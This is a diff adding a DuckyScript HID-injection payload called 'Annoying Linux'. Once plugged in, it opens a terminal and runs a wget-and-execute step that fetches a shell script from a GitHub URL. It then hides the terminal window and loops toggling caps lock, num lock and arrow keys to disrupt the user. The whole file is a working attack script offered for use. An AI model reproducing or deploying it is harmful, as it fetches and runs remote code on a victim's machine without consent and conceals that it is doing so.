@@ -1,0 +1,42 @@
+REM TITLE: Annoying Linux
+REM AUTHOR: OSINTI4L
+REM TARGET OS: Linux (tested on Pop!_OS)
+REM DESCRIPTION: An annoying payload that utilizes ducky/bash scripts to randomly turn on and off: wifi, capslock, numlock, press arrow keys, and teleport the mouse pointer around the screen.
+
+REM Begin attack:
+ATTACKMODE HID
+	DELAY 1000
+
+REM Opening terminal:
+CTRL ALT t
+    DELAY 300
+
+REM Downloading Annoying_Linux.sh script, giving execution permissions, and then executing it:
+STRINGLN wget https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads-Linux/refs/heads/main/Payloads/Annoying_Linux/Annoying_Linux.sh
+    DELAY 1000
+STRINGLN chmod +x Annoying_Linux.sh && ./Annoying_Linux.sh
+    DELAY 100
+
+REM Hiding terminal window:
+ALT SPACE
+    DELAY 50
+        DOWN
+            ENTER
+            
+REM Beginning loop to toggle capslock, numlock, and move arrow keys up and down:
+WHILE TRUE
+    CAPSLOCK
+    DELAY 1000
+        NUMLOCK
+        DELAY 1000
+            UP
+            UP
+            DELAY 1000
+            DOWN
+            DOWN
+            DELAY 1000
+        CAPSLOCK
+        DELAY 1000
+    NUMLOCK
+    DELAY 1000
+END_WHILE
